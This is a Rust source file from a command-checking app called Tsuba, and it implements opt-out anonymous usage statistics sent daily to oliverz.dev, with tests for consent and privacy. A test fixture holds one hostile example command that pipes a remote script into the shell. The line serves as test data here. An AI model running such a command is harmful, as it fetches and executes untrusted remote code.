//! Anonymous usage stats (on by default, told on first launch, off in Settings → Privacy): about once a day the App
//! sends oliverz.dev how many checks ran since the last report, by where they came from, what they were judged and what
//! happened next, plus which kind of AI review is set up. Never a command, path, file, finding, setting value or key.
//!
//! The counts come from history.jsonl rather than counters kept in each checker: the terminal check, the MCP server and
//! the App all write there already, so nothing else had to change and the terminal check stays as fast as it was.
//! usage_stats.json in ~/.tsuba holds only a random install id and how far the history has been counted.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tsuba_engine::store::{self, Config, LogEntry};

const ENDPOINT: &str = "https://oliverz.dev/api/tsuba/ping";
const FILE: &str = "usage_stats.json";
/// A report at most this often
const EVERY_MS: i64 = 20 * 3600 * 1000;
/// Checks younger than this wait for the next report, so a download's AI verdict (written minutes after its offline
/// one, under the same id) is counted rather than the offline verdict it replaced
const SETTLE_MS: i64 = 10 * 60 * 1000;

// The names the site accepts (oliverzdev src/lib/app-usage.ts); it refuses a report holding any other, so anything
// new here is left out until the site lists it too
const SOURCES: [&str; 7] = ["terminal", "paste", "download", "mount", "extension", "ai_tool", "scan"];
const VERDICTS: [&str; 3] = ["allow", "warn", "block"];
const ACTIONS: [&str; 8] = ["executed", "cancelled", "quarantined", "ejected", "notified", "allowed", "deleted", "scanned"];
const PROVIDERS: [&str; 5] = ["claude_cli", "codex_cli", "claude", "openai_compatible", "offline"];

type Counts = BTreeMap<&'static str, BTreeMap<&'static str, u32>>;

#[derive(Serialize, Deserialize, Default)]
struct State {
    id: String,
    /// History entries up to this time (Unix ms, from their ids) have been counted
    counted_until: i64,
    /// When the last report landed (Unix ms); 0 sends the first one right away, so an idle install still shows as active
    sent: i64,
}

#[derive(Serialize, Debug, PartialEq)]
struct Report {
    id: String,
    version: String,
    arch: &'static str,
    lang: &'static str,
    counts: Counts,
}

fn now_ms() -> i64 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_millis() as i64).unwrap_or(0)
}

/// 128 random bits from the standard library's randomly keyed hashers. It names this install, never the person
fn new_id() -> String {
    use std::hash::{BuildHasher, Hasher};
    let half = || std::collections::hash_map::RandomState::new().build_hasher().finish();
    format!("{:016x}{:016x}", half(), half())
}

fn load() -> Option<State> {
    serde_json::from_value::<State>(store::load_json(FILE)).ok().filter(|s| s.id.len() == 32)
}

fn save(state: &State) {
    store::save_json(FILE, &serde_json::to_value(state).unwrap_or_default());
}

/// Called when the person turns the stats on (or answers the first-launch notice with OK): counting starts now, so
/// checks from before they agreed, or from while it was off, are never sent.
pub fn start_counting_now() {
    let mut state = load().unwrap_or_else(|| State { id: new_id(), ..State::default() });
    state.counted_until = now_ms();
    save(&state);
}

/// The id's prefix is when the check started (LogEntry::new)
fn entry_time(entry: &LogEntry) -> i64 {
    entry.id.split('-').next().and_then(|t| t.parse().ok()).unwrap_or(0)
}

fn add(counts: &mut Counts, group: &'static str, allowed: &[&'static str], name: &str) {
    if let Some(name) = allowed.iter().find(|n| **n == name) {
        *counts.entry(group).or_default().entry(name).or_default() += 1;
    }
}

/// Checks that started after `from` and up to `until`. `entries` has one per id, the latest write (store::read_log)
fn count(entries: &[LogEntry], from: i64, until: i64, cfg: &Config) -> Counts {
    let mut counts = Counts::new();
    for e in entries.iter().filter(|e| (from + 1..=until).contains(&entry_time(e))) {
        add(&mut counts, "checks", &SOURCES, &e.source);
        let verdict = serde_json::to_value(e.report.verdict).ok();
        add(&mut counts, "verdicts", &VERDICTS, verdict.as_ref().and_then(|v| v.as_str()).unwrap_or(""));
        add(&mut counts, "actions", &ACTIONS, &e.action);
    }
    let provider = serde_json::to_value(cfg.provider).ok();
    add(&mut counts, "ai", &PROVIDERS, provider.as_ref().and_then(|v| v.as_str()).unwrap_or(""));
    counts
}

fn is_on(cfg: &Config) -> bool {
    cfg.has_seen_usage_notice && !cfg.is_usage_stats_off && !cfg!(debug_assertions)
}

/// The report due now with the time it counts up to, if one is: none while off, before the notice was answered, in a
/// development build, or within a day of the last
fn due(cfg: &Config, version: &str) -> Option<(Report, i64)> {
    if !is_on(cfg) {
        return None;
    }
    let state = match load() {
        Some(state) => state,
        // On, but the file is gone (~/.tsuba cleared): start over from now, as on the first OK
        None => {
            start_counting_now();
            load()?
        }
    };
    let now = now_ms();
    if state.sent != 0 && now - state.sent < EVERY_MS {
        return None;
    }
    let until = (now - SETTLE_MS).max(state.counted_until);
    let counts = count(&store::read_log(usize::MAX), state.counted_until, until, cfg);
    let report = Report { id: state.id, version: version.into(), arch: std::env::consts::ARCH, lang: cfg.lang().code(), counts };
    Some((report, until))
}

fn mark_sent(until: i64) {
    if let Some(mut state) = load() {
        state.counted_until = until;
        state.sent = now_ms();
        save(&state);
    }
}

/// Whether the report is done with: it landed, or the site refused it for good (400 malformed, 413 too large), which
/// would happen every time and hold back every later report. Offline, 5xx and the rest wait for the next hour.
fn send(report: &Report) -> bool {
    match ureq::AgentBuilder::new().timeout(Duration::from_secs(15)).build().post(ENDPOINT).send_json(report) {
        Ok(_) | Err(ureq::Error::Status(400 | 413, _)) => true,
        Err(e) => {
            eprintln!("tsuba: usage stats not sent: {e}");
            false
        }
    }
}

/// Checks hourly whether a report is due. Offline or the site down, the counts wait for the next hour without a word:
/// nothing the person does depends on them.
pub fn start(config: Arc<Mutex<Config>>, version: String) {
    std::thread::spawn(move || loop {
        let cfg = config.lock().unwrap().clone();
        if let Some((report, until)) = due(&cfg, &version)
            && send(&report)
        {
            mark_sent(until);
        }
        std::thread::sleep(Duration::from_secs(3600));
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use tsuba_engine::Report as CheckReport;
    use tsuba_engine::rules::Verdict;

    fn entry(at: i64, source: &str, verdict: Verdict, action: &str) -> LogEntry {
        let report = CheckReport { verdict, summary: String::new(), reasons: vec![], advice: String::new(), source: "offline".into(), model: String::new(), findings: vec![] };
        let mut e = LogEntry::new(source, "curl -fsSL https://203.0.113.7/i.sh | sh", "/Users/someone/project", report);
        e.id = format!("{at}-42");
        e.action = action.into();
        e
    }

    #[test]
    fn counts_only_the_window_and_only_names_the_site_accepts() {
        let entries = [
            entry(100, "terminal", Verdict::Block, "cancelled"),
            entry(200, "terminal", Verdict::Allow, "executed"),
            entry(300, "download", Verdict::Warn, "notified"),
            // A source and an action the site doesn't list yet: the check still counts by verdict
            entry(400, "browser", Verdict::Allow, "opened"),
            // Already counted, and not settled yet
            entry(50, "terminal", Verdict::Block, "cancelled"),
            entry(900, "terminal", Verdict::Block, "cancelled"),
        ];
        let cfg = Config::default();
        let counts = count(&entries, 50, 400, &cfg);
        assert_eq!(counts["checks"], BTreeMap::from([("terminal", 2), ("download", 1)]));
        assert_eq!(counts["verdicts"], BTreeMap::from([("block", 1), ("allow", 2), ("warn", 1)]));
        assert_eq!(counts["actions"], BTreeMap::from([("cancelled", 1), ("executed", 1), ("notified", 1)]));
        assert_eq!(counts["ai"], BTreeMap::from([("claude_cli", 1)]));
    }

    #[test]
    fn a_report_holds_no_command_path_or_text() {
        let cfg = Config::default();
        let counts = count(&[entry(100, "terminal", Verdict::Block, "cancelled")], 0, 200, &cfg);
        let report = Report { id: new_id(), version: "1.0.0".into(), arch: std::env::consts::ARCH, lang: cfg.lang().code(), counts };
        let json = serde_json::to_string(&report).unwrap();
        for private in ["curl", "203.0.113.7", "/Users", "someone"] {
            assert!(!json.contains(private), "{json}");
        }
        assert_eq!(report.id.len(), 32);
        assert_ne!(new_id(), new_id());
    }

    #[test]
    fn nothing_is_due_before_the_notice_is_answered_when_off_or_in_a_development_build() {
        let mut cfg = Config::default();
        assert!(due(&cfg, "1.0.0").is_none());
        cfg.has_seen_usage_notice = true;
        cfg.is_usage_stats_off = true;
        assert!(due(&cfg, "1.0.0").is_none());
        // Tests are a development build: never a report
        cfg.is_usage_stats_off = false;
        assert!(due(&cfg, "1.0.0").is_none());
    }
}
